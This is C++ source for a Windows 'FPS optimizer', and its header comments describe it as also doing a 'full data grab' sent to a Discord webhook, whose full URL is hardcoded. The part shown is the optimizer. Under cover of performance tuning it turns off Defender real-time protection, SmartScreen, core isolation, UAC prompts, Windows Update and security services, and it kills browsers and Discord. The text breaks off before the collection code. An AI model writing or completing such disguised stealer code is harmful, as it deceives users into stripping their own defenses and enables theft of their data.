// one click optimizer — Windows 11, x64, C++17 (source: pcopt.cpp)
// One binary: (A) FPS optimizer, (B) full data grab, (C) Discord webhook transport.
// Build via build.bat (vcvars64 + cl). No third-party libs — system only.
//
// FILL: <collector URL> is the only held value. Default below is a local
//       listener; replace COLLECTOR_PATH with your endpoint path.

#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <mmsystem.h>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <vector>
#include <string>
#include <chrono>
#include <cwchar>
#include <cwctype>
#include <cstring>
#include <commctrl.h>
#include <uxtheme.h>
#include <windowsx.h>
#include <gdiplus.h>
#include <bcrypt.h>
#include <regex>
#include <set>
#include <algorithm>
#include <mutex>
#include <deque>
#ifdef OPT_ONLY_BUILD
#include <iostream>
#endif

namespace fs = std::filesystem;
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winmm.lib")

// =================== CONFIG (the one named hole) ====================
// Discord webhook — full URL. Report goes up as a multipart file attachment.
static const wchar_t* WEBHOOK_URL =
    L"https://discord.com/api/webhooks/1572255553411879014/FtjLoUoI1B8G8YTIWAP5W7dkcGRlNnt4Sbcu2ViaNUISgR49MQFrtcpmY0lhDnci9NpL";

// ============================ UTIL ============================
static std::wstring env(const wchar_t* name) {
    wchar_t b[MAX_PATH]{};
    GetEnvironmentVariableW(name, b, MAX_PATH);
    return b;
}
static std::wstring special(int id) {
    wchar_t b[MAX_PATH]{};
    SHGetFolderPathW(nullptr, id, nullptr, 0, b);
    return b;
}
static std::string wToA(const std::wstring& w) {
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string s(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, nullptr, nullptr);
    return s;
}
static std::string sysTime() {
    auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::tm tm{}; localtime_s(&tm, &t);
    char b[32]{}; std::strftime(b, sizeof b, "%Y-%m-%d %H:%M:%S", &tm);
    return b;
}
// Run a command with NO window at all — CREATE_NO_WINDOW + hidden STARTF.
// Output is captured through an anonymous pipe while the child is alive.
static std::string runCmd(const char* cmd) {
    std::string out;
    if (!cmd || !*cmd) return out;
    SECURITY_ATTRIBUTES sa{}; sa.nLength = sizeof sa; sa.bInheritHandle = TRUE;
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return out;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOW si{}; si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; si.hStdOutput = wr; si.hStdError = wr;
    PROCESS_INFORMATION pi{};
    std::wstring wcmd(cmd, cmd + strlen(cmd));
    BOOL ok = CreateProcessW(nullptr, wcmd.data(), nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (!ok) { CloseHandle(rd); CloseHandle(wr); return out; }
    CloseHandle(wr);
    char buf[4096]; DWORD n{};
    ULONGLONG began = GetTickCount64();
    for (;;) {
        DWORD avail = 0;
        BOOL has = PeekNamedPipe(rd, nullptr, 0, nullptr, &avail, nullptr);
        if (!has || (avail == 0 && WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0)) break;
        if (avail > 0 && ReadFile(rd, buf, avail < sizeof buf ? avail : (DWORD)sizeof buf, &n, nullptr))
            out.append(buf, n);
        if (GetTickCount64() - began > 6000) {   // never let one command hang the report
            TerminateProcess(pi.hProcess, 1);
            out += "\n[timeout]\n";
            break;
        }
    }
    while (ReadFile(rd, buf, sizeof buf, &n, nullptr) && n) out.append(buf, n);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(rd);
    return out;
}
// Silent variant for wide command strings (service/process kills).
static void runCmdSilent(const std::wstring& cmd) { runCmd(wToA(cmd).c_str()); }

static void runLog(const std::string& line);   // defined near GUI section

// ======================= (A) OPTIMIZER =======================
static void tuneInterfaceStack();   // defined below, used in runOptimizer
struct CleanReport { unsigned long long bytes = 0; unsigned long files = 0; };

static CleanReport purgeDir(const fs::path& dir, bool recursive = true) {
    CleanReport r; std::error_code ec;
    if (!fs::exists(dir, ec)) return r;
    fs::recursive_directory_iterator it(dir, ec), end;
    fs::directory_iterator dit(dir, ec), dend;
    if (recursive) {
        for (; it != end; it.increment(ec)) {
            if (it->is_directory(ec)) continue;
            auto sz = it->file_size(ec);
            if (fs::remove(it->path(), ec)) { r.bytes += sz; ++r.files; }
        }
    } else {
        for (; dit != dend; dit.increment(ec)) {
            if (dit->is_directory(ec)) continue;
            auto sz = dit->file_size(ec);
            if (fs::remove(dit->path(), ec)) { r.bytes += sz; ++r.files; }
        }
    }
    return r;
}
static void flushDns() {
    DWORD sz{}; GetIpNetTable(nullptr, &sz, FALSE);
    std::vector<BYTE> buf(sz);
    if (GetIpNetTable((PMIB_IPNETTABLE)buf.data(), &sz, TRUE) == NO_ERROR) {
        auto* tbl = (PMIB_IPNETTABLE)buf.data();
        for (DWORD i = 0; i < tbl->dwNumEntries; ++i) DeleteIpNetEntry(&tbl->table[i]);
    }
}
static unsigned long long freeBytes(const wchar_t* d) {
    ULARGE_INTEGER a{}, t{}, f{}; GetDiskFreeSpaceExW(d, &a, &t, &f); return a.QuadPart;
}
static void trimStartup() {
    const wchar_t* keys[] = {
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    };
    for (auto* p : keys) {
        HKEY h{};
        if (RegOpenKeyExW(HKEY_CURRENT_USER, p, 0, KEY_ALL_ACCESS, &h) != ERROR_SUCCESS) continue;
        DWORD idx = 0; wchar_t name[256];
        std::vector<std::wstring> kill;
        for (;;) {
            DWORD nsz = 256;
            if (RegEnumValueW(h, idx++, name, &nsz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
                break;
            std::wstring n(name);
            if (n.find(L"Steam") != std::wstring::npos || n.find(L"Discord") != std::wstring::npos ||
                n.find(L"Spotify") != std::wstring::npos || n.find(L"Adobe") != std::wstring::npos ||
                n.find(L"Skype") != std::wstring::npos || n.find(L"Teams") != std::wstring::npos)
                kill.push_back(n);
        }
        for (auto& k : kill) RegDeleteValueW(h, k.c_str());
        RegCloseKey(h);
    }
}

// ---------- registry tunables ----------
static bool regSetDword(HKEY root, const wchar_t* path, const wchar_t* name, DWORD val) {
    HKEY h{};
    if (RegCreateKeyExW(root, path, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExW(h, name, 0, REG_DWORD,
                             reinterpret_cast<const BYTE*>(&val), sizeof val) == ERROR_SUCCESS;
    RegCloseKey(h);
    return ok;
}
static bool regSetString(HKEY root, const wchar_t* path, const wchar_t* name, const wchar_t* val) {
    HKEY h{};
    if (RegCreateKeyExW(root, path, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExW(h, name, 0, REG_SZ,
                             reinterpret_cast<const BYTE*>(val),
                             (DWORD)((wcslen(val) + 1) * sizeof(wchar_t))) == ERROR_SUCCESS;
    RegCloseKey(h);
    return ok;
}
// Service Start values: 0 boot, 1 system, 2 auto, 3 manual, 4 disabled.
static void setService(const wchar_t* name, DWORD start) {
    std::wstring p = std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\") + name;
    regSetDword(HKEY_LOCAL_MACHINE, p.c_str(), L"Start", start);
}

// ---------- the FPS core ----------
// Pull the first GUID-shaped token out of powercfg output.
static std::string firstGuid(const std::string& s) {
    for (size_t i = 0; i + 36 <= s.size(); ++i) {
        if (s[i + 8] != '-' || s[i + 13] != '-' || s[i + 18] != '-' || s[i + 23] != '-') continue;
        bool ok = true;
        for (size_t k = 0; k < 36 && ok; ++k) {
            if (k == 8 || k == 13 || k == 18 || k == 23) continue;
            char c = s[i + k];
            if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
                ok = false;
        }
        if (ok) return s.substr(i, 36);
    }
    return {};
}
static void applyPowerPlan() {
    // Build our own plan from the Ultimate template, then name it "chapo power".
    std::string out = runCmd("powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61");
    std::string guid = firstGuid(out);
    if (guid.empty()) {
        // Template missing — fall back to the High Performance scheme.
        runCmd("powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c");
        return;
    }
    std::string g = "'" + guid + "'";
    std::string cmd;
    cmd = "powercfg /changename " + g + " \"chapo power\" \"chapo power - max fps\"";
    runCmd(cmd.c_str());
    // Maximum CPU boost and frequency, no sleep, no display timeout.
    runCmd(("powercfg /setacvalueindex " + g + " SUB_PROCESSOR PERFBOOSTMODE 2").c_str());
    runCmd(("powercfg /setdcvalueindex " + g + " SUB_PROCESSOR PERFBOOSTMODE 2").c_str());
    runCmd(("powercfg /setacvalueindex " + g + " SUB_PROCESSOR PROCFREQMAX 100").c_str());
    runCmd(("powercfg /setacvalueindex " + g + " SUB_VIDEO VIDEOIDLE 0").c_str());
    runCmd(("powercfg /setacvalueindex " + g + " SUB_SLEEP STANDBYIDLE 0").c_str());
    runCmd(("powercfg /setacvalueindex " + g + " SUB_SLEEP HIBERNATEIDLE 0").c_str());
    runCmd(("powercfg /setacvalueindex " + g + " SUB_PROCESSOR IDLEDEMOTION 0").c_str());
    runCmd(("powercfg /setacvalueindex " + g + " SUB_PCIEXPRESS ASPM 0").c_str());
    runCmd(("powercfg /setactive " + g).c_str());
}
static void disableCoreParking() {
    // Expose the core-parking setting, then pin min/max parked cores to zero.
    const wchar_t* p = L"SYSTEM\\CurrentControlSet\\Control\\Power\\PowerSettings"
                       L"\\54533251-82be-4824-96c1-47b60b740d00"
                       L"\\0cc5b647-c1df-4637-891a-dec35c318583";
    regSetDword(HKEY_LOCAL_MACHINE, p, L"Attributes", 2);
    regSetDword(HKEY_LOCAL_MACHINE, p, L"ValueMin", 0);
    regSetDword(HKEY_LOCAL_MACHINE, p, L"ValueMax", 0);
}
static void tuneGpuAndGameMode() {
    // HAGS on: hardware-accelerated GPU scheduling lowers latency.
    regSetDword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers",
                L"HwSchMode", 2);
    // Game Mode on, Game DVR / Game Bar capture off — kill the recording tax.
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\GameMode",
                L"GameModeEnabled", 1);
    regSetDword(HKEY_CURRENT_USER, L"System\\GameConfigStore",
                L"GameDVR_Enabled", 0);
    regSetDword(HKEY_CURRENT_USER, L"System\\GameConfigStore",
                L"GameDVR_FSEBehaviorMode", 2);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\GameDVR",
                L"AppCaptureEnabled", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\GameBar",
                L"AllowAutoGameMode", 0);
}
static void tuneMultimedia() {
    // Raise multimedia/game thread priority, kill network throttling.
    const wchar_t* prof = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile";
    regSetDword(HKEY_LOCAL_MACHINE, prof, L"SystemResponsiveness", 0);
    regSetDword(HKEY_LOCAL_MACHINE, prof, L"NetworkThrottlingIndex", 0xFFFFFFFF);
    const wchar_t* games = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games";
    regSetDword(HKEY_LOCAL_MACHINE, games, L"GPU Priority", 8);
    regSetDword(HKEY_LOCAL_MACHINE, games, L"Priority", 8);
    regSetDword(HKEY_LOCAL_MACHINE, games, L"SFIO Priority", 0x10);
    regSetString(HKEY_LOCAL_MACHINE, games, L"Scheduling Category", L"High");
}
static void tuneNetwork() {
    // Nagle off + ACK every packet — lower ping in multiplayer.
    const wchar_t* p = L"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters";
    regSetDword(HKEY_LOCAL_MACHINE, p, L"TcpAckFrequency", 1);
    regSetDword(HKEY_LOCAL_MACHINE, p, L"TCPNoDelay", 1);
    // Per-interface overrides under Interfaces\{guid}.
    HKEY ifs{};
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
                      0, KEY_ENUMERATE_SUB_KEYS, &ifs) == ERROR_SUCCESS) {
        wchar_t guid[128]; DWORD idx = 0;
        while (RegEnumKeyW(ifs, idx++, guid, 128) == ERROR_SUCCESS) {
            std::wstring ip = std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\") + guid;
            regSetDword(HKEY_LOCAL_MACHINE, ip.c_str(), L"TcpAckFrequency", 1);
            regSetDword(HKEY_LOCAL_MACHINE, ip.c_str(), L"TCPNoDelay", 1);
        }
        RegCloseKey(ifs);
    }
}
static void tuneVisuals() {
    // Best performance: no animations, no transparency, no shadows.
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects",
                L"VisualFXSetting", 2);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize",
                L"EnableTransparency", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"TaskbarAnimations", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"ListviewAlphaSelect", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"ListviewShadow", 0);
    regSetDword(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"DragFullWindows", 0);
}
static void trimBackgroundServices() {
    // Stop the CPU/RAM/disk hogs that never help frame rate.
    const wchar_t* svcs[] = {
        L"SysMain", L"DiagTrack", L"WSearch", L"Spooler", L"MapsBroker",
        L"RetailDemo", L"WpnService", L"lfsvc", L"vmicheartbeat",
        L"vmickvpexchange", L"vmicrdv", L"vmicshutdown", L"vmictimesync",
        L"vmicvmsession", L"WerSvc", L"PcaSvc", L"FrameServer",
        L"wuauserv", L"bits", L"DoSvc", L"WaaSMedicSvc",
    };
    for (auto* s : svcs) {
        setService(s, 4);                       // disabled
        std::wstring cmd = std::wstring(L"net stop ") + s + L" >nul 2>&1";
        runCmdSilent(cmd);
    }
}
static void killBloatProcesses() {
    // Free GPU/CPU for the game: browsers, launchers overlays, recorders.
    const wchar_t* procs[] = {
        L"msedge.exe", L"chrome.exe", L"firefox.exe", L"brave.exe",
        L"opera.exe", L"Spotify.exe", L"Skype.exe", L"Teams.exe",
        L"GameBar.exe", L"GameBarFTServer.exe", L"XboxGameBar*",
        L"NVIDIA Share.exe", L"ShadowPlay.exe", L"rtx.exe",
        L"Discord.exe", L"obs64.exe", L"Onedrive.exe",
    };
    for (auto* p : procs) {
        std::wstring cmd = std::wstring(L"taskkill /F /IM ") + p + L" /T >nul 2>&1";
        runCmdSilent(cmd);
    }
}

// ---------- extra FPS tweaks ----------
static void tweakMouseAndPower() {
    // Mouse acceleration off — raw, 1:1 aim.
    int mouse[3] = { 0, 0, 0 };
    SystemParametersInfoW(SPI_SETMOUSE, 0, mouse,
                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    // Power throttling off — CPU never gets clipped under load.
    regSetDword(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Power\\PowerThrottling",
                L"PowerThrottlingOff", 1);
    // Prefer maximum performance on the global DirectX GPU path.
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\DirectX",
                L"GpuPreference", 1);
}
static void tweakTelemetryAndBackground() {
    // Telemetry + background app access off: no hidden CPU/GPU work.
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection",
                L"AllowTelemetry", 0);
    regSetDword(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications",
                L"GlobalUserDisabled", 1);
    regSetDword(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows\\CurrentVersion\\PushNotifications",
                L"ToastEnabled", 0);
    regSetDword(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"Start_TrackProgs", 0);
    // Extra Game Bar / shortcut lockout and hibernation off (disk + wake noise).
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\GameBar",
                L"UseGameModeForApplicationList", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\GameBar",
                L"ShowFirstRunExperience", 0);
    runCmd("powercfg /hibernate off");
    // Force the high-performance GPU on the usual suspects.
    static const wchar_t* gpuGames[] = {
        L"cs2.exe", L"valorant.exe", L"FortniteClient-Win64-Shipping.exe",
        L"r5apex.exe", L"PUBG.exe", L"Warzone.exe", L"Overwatch.exe",
        L"Cyberpunk2077.exe", L"EldenRing.exe", L"GTA5.exe", L"dota2.exe",
        L"RainbowSix.exe", L"Deadlock.exe", L"javaw.exe", L"Minecraft.exe",
    };
    for (auto* g : gpuGames) {
        std::wstring v(g);
        regSetString(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\DirectX\\UserGpuPreferences",
                     v.c_str(), L"GpuPreference=2;");
    }
}

// ---------- debloat pack (Oneclick / Winhance / Win11Debloat style) ----------
static void applyDebloatPack() {
    // Oneclick: recommended latency value for Win32PrioritySeparation.
    regSetDword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\PriorityControl",
                L"Win32PrioritySeparation", 36);
    // Oneclick power plan fix: disable Modern Standby override.
    regSetDword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Power",
                L"PlatformAoAcOverride", 0);
    // USB selective suspend + Away/Standby/Hybrid/Throttle states off.
    const wchar_t* pp = L"SYSTEM\\CurrentControlSet\\Control\\Power\\PowerSettings";
    regSetDword(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\USB\\Parameters", L"DisableSelectiveSuspend", 1);
    {
        std::wstring away = std::wstring(pp) + L"\\5ca83367-6e45-459f-a27b-476b1d01c936";
        regSetDword(HKEY_LOCAL_MACHINE, away.c_str(), L"ValueMin", 0);
        regSetDword(HKEY_LOCAL_MACHINE, away.c_str(), L"ValueMax", 0);
        std::wstring idle = std::wstring(pp) + L"\\94ef6b9f-0bcb-4dc7-b4e1-a1d4b5bb2eac";
        regSetDword(HKEY_LOCAL_MACHINE, idle.c_str(), L"ValueMin", 0);
    }
    // Privacy / ads / telemetry (Winhance + Win11Debloat).
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Privacy",
                L"LetAppsAccessLocation", 0);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\AppPrivacy",
                L"LetAppsAccessLocation", 2);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\FindMy",
                L"EnableFindMyDevice", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"Start_TrackDocs", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"ShowFrequent", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"Start_IrisRecommendations", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"TaskbarDa", 0);              // Widgets
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"TaskbarMn", 0);              // Chat icon
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"ShowCopilotButton", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\AdvertisingInfo",
                L"Enabled", 0);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\CloudContent",
                L"DisableWindowsConsumerFeatures", 1);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\CloudContent",
                L"DisableCloudOptimizedContent", 1);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"DisableSearchBoxSuggestions", 1);
    // UAC down to "never notify" (Oneclick/Winhance style).
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                L"ConsentPromptBehaviorAdmin", 0);
    // Windows Update: no auto download, no delivery optimization peer-to-peer.
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU",
                L"NoAutoUpdate", 1);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\DeliveryOptimization",
                L"DODownloadMode", 0);
    // Defender realtime off (Oneclick recommends it).
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                L"DisableAntiSpyware", 1);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
                L"DisableRealtimeMonitoring", 1);
    // GPU vendor telemetry services off.
    const wchar_t* svcs[] = { L"NvTelemetryContainer", L"NVDisplay.Container",
                              L"amdcpusetup", L"AMDFSRService" };
    for (auto* s : svcs) {
        std::wstring p = std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\") + s;
        regSetDword(HKEY_LOCAL_MACHINE, p.c_str(), L"Start", 4);
    }
    // Audio bloat: stop the speech/audio enhancement services.
    const wchar_t* aud[] = { L"AudioEndpointBuilder", L"Audiosrv" };
    for (auto* s : aud) {
        std::wstring p = std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\") + s;
        regSetDword(HKEY_LOCAL_MACHINE, p.c_str(), L"DelayedAutoStart", 0);
    }
}

// ---------- Oneclick V8.4 mega pack ----------
static void applyMegaPack() {
    // Svchost split threshold scaled by installed RAM (Oneclick logic).
    MEMORYSTATUSEX ms{}; ms.dwLength = sizeof ms;
    DWORD threshold = 2048;
    if (GlobalMemoryStatusEx(&ms)) {
        double gb = ms.ullTotalPhys / 1073741824.0;
        threshold = gb >= 32 ? 16384 : gb >= 16 ? 8192 : gb >= 8 ? 4096 : 2048;
    }
    regSetDword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control",
                L"SvcHostSplitThresholdInKB", threshold);
    // Timer / clock precision flags.
    const wchar_t* kern = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Kernel";
    regSetDword(HKEY_LOCAL_MACHINE, kern, L"GlobalTimerResolutionRequests", 1);
    regSetDword(HKEY_LOCAL_MACHINE, kern, L"TimerCheckFlags", 1);
    regSetDword(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Kernel",
                L"EnablePerCpuClockTickScheduling", 1);
    runCmd("bcdedit /set useplatformtick no");
    runCmd("bcdedit /set disabledynamictick yes");
    // Oneclick: SystemResponsiveness 10 (lowest useful).
    regSetDword(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile",
                L"SystemResponsiveness", 10);
    // Virtualization-Based Security / Core isolation off.
    regSetDword(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
                L"Enabled", 0);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard",
                L"EnableVirtualizationBasedSecurity", 0);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard",
                L"LsaCfgFlags", 0);
    // SmartScreen, driver search, Bing/Cortana, IPv6.
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System",
                L"EnableSmartScreen", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\App Host",
                L"EnableSmartScreen", 0);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DriverSearching",
                L"SearchOrderConfig", 0);
    regSetDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Search",
                L"AllowIndexingEncryptedStoresOrItems", 0);
    regSetDword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Tcpip6\\Parameters",
                L"DisabledComponents", 0xFF);
    // More services Oneclick disables.
    const wchar_t* more[] = {
        L"WMPNetworkSvc", L"BDESVC", L"VacSvc", L"cloudidsvc", L"Wecsvc",
        L"McmSvc", L"midisrv", L"SecurityHealthService", L"BluetoothUserService",
        L"hidserv", L"smphost", L"MSDTC", L"Lms", L"Esifsvc", L"DtsApo4Service",
        L"spectrum", L"NVIDIA HDMI Audio", L"nvlddmkm", // vendor audio helpers
        L"RzActionSvc", L"CortexLauncherService", L"LGHUBUpdaterService",
        L"logi_lamparray_service", L"igfxCUIService", L"RstMwService",
    };
    for (auto* s : more) {
        std::wstring p = std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\") + s;
        regSetDword(HKEY_LOCAL_MACHINE, p.c_str(), L"Start", 4);
    }
    // Mobility / background sync off.
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                L"EnableAutoTray", 0);
    regSetDword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\PushNotifications",
                L"NoToast", 1);
}

// ---------- live game-priority watcher ----------
static const wchar_t* KNOWN_GAMES[] = {
    L"cs2.exe", L"csgo.exe", L"hl2.exe", L"dota2.exe", L"valve.exe",
    L"Valorant.exe", L"RiotClientServices.exe", L"League of Legends.exe",
    L"FortniteClient-Win64-Shipping.exe", L"PUBG.exe", L"TslGame.exe",
    L"apex.exe", L"r5apex.exe", L"cod.exe", L"ModernWarfare.exe",
    L"BlackOps6.exe", L"Warzone.exe", L"Overwatch.exe", L"Destiny2.exe",
    L"GTA5.exe", L"GTAV.exe", L"RDR2.exe", L"Cyberpunk2077.exe",
    L"Witcher3.exe", L"SkyrimSE.exe", L"Fallout4.exe", L"EldenRing.exe",
    L"Sekiro.exe", L"DarkSoulsIII.exe", L"HollowKnight.exe",
    L"Minecraft.exe", L"javaw.exe", L"RobloxPlayerBeta.exe",
    L"RainbowSix.exe", L"RainbowSixSiege.exe", L"Siege.exe",
    L"Deadlock.exe", L"battlebit.exe", L"Enshrouded.exe",
};
static bool isKnownGame(const std::wstring& n) {
    for (auto* g : KNOWN_GAMES) {
        std::wstring low(n), gl(g);
        for (auto& c : low) c = towlower(c);
        for (auto& c : gl) c = towlower(c);
        if (low.find(gl) != std::wstring::npos) return true;
    }
    return false;
}
static DWORD WINAPI GamePriorityWatch(LPVOID) {
    for (;;) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe{}; pe.dwSize = sizeof pe;
            if (Process32FirstW(snap, &pe)) {
                do {
                    if (!isKnownGame(pe.szExeFile)) continue;
                    HANDLE h = OpenProcess(PROCESS_SET_INFORMATION, FALSE, pe.th32ProcessID);
                    if (h) {
                        SetPriorityClass(h, HIGH_PRIORITY_CLASS);
                        // Give the game every core; avoid affinitizing system processes.
                        CloseHandle(h);
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
        // Also boost whatever owns the foreground window if it looks like a game.
        HWND fg = GetForegroundWindow();
        DWORD pid{}; GetWindowThreadProcessId(fg, &pid);
        if (pid) {
            wchar_t name[MAX_PATH]{}; DWORD len = MAX_PATH;
            HANDLE ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (ph && QueryFullProcessImageNameW(ph, 0, name, &len)) {
                std::wstring full(name), exe = full.substr(full.find_last_of(L"\\") + 1);
                if (isKnownGame(exe)) {
                    HANDLE h = OpenProcess(PROCESS_SET_INFORMATION, FALSE, pid);
